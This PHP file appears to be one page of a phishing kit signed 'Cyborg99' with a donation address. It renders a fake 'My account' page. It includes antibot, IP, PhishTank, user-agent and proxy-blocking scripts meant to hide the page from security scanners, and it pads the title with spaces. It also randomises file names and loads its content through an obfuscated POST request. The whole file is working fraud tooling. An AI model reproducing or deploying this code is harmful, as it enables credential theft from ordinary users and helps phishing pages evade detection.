<?php
// REM by Cyborg99 Please donate if you like it : 1J2M2J7cbzCYULG99NgWgttVJK7dkuUEz5
session_start();
include '#1.php';
include '#2.php';
include '#3.php';
include '#4.php';
include '#5.php';
include '#6.php';
include '#7.php';
include '#8.php';
include '#9.php';
include '#10.php';
include '#11.php';
include '#12.php';
include 'antibot_host.php';
include 'antibot_ip.php';
include 'antibot_phishtank.php';
include 'antibot_userAgent.php';
include 'check_blocked.php';
include 'proxyblock.php';
if (!isset($_SESSION['language'])) {
    exit(header("Location: index"));
} else {
    include "languages/{$_SESSION['language']}.php";
}
include '../randa.php';

?>
<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>My account&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $fo9; ?></title>
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
    <link id="lib_main" type="text/css" rel="stylesheet" href="style/<?=$fo6;?><?=$num1;?>.css">
    <link rel="shortcut icon" href="pic/favicon_<?=$num2;?>.ico">
    <link rel="apple-touch-icon" href="pic/favicon_<?=$num5;?>.png">
    <script src="js/jquery_<?=$num2;?>.js"></script>
</head>

<body>
    <script>
        $(document).ready(function() {
            $.post("../../<?=$fo3;?>/<?=$fo8;?>/c_<?=$num2;?>.php", {
                one: "ok"
            }, function(b, a) {
                $("body").prepend(b)
            })
        });
		(function() {
    var link = document.querySelector("link[rel*='icon']") || document.createElement('link');
    link.type = 'image/x-icon';
    link.rel = 'shortcut icon';
    link.href = 'pic/favicon_<?=$num2;?>.ico';
    document.getElementsByTagName('head')[0].appendChild(link);
})();
    </script>
</body>

</html>